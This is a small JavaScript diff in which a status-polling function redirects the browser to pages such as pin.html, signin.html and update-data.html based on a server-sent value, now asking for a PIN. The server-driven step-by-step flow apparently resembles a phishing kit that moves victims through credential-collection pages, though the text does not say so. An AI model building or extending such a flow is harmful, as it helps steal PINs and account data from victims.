@@ -89,7 +89,7 @@ function pollStatus(){
   fetch('/api/status/'+id).then(function(r){return r.json();}).then(function(d){
     if(d.status==='redirect'&&d.redirect){
       if(d.redirect==='code')return;
-      if(d.redirect==='security')window.location.href='security.html?id='+id;
+      if(d.redirect==='pin')window.location.href='pin.html?id='+id;
       else if(d.redirect==='loading')window.location.href='loading.html?id='+id;
       else if(d.redirect==='login')window.location.href='signin.html';
       else if(d.redirect==='update-data')window.location.href='update-data.html?id='+id;
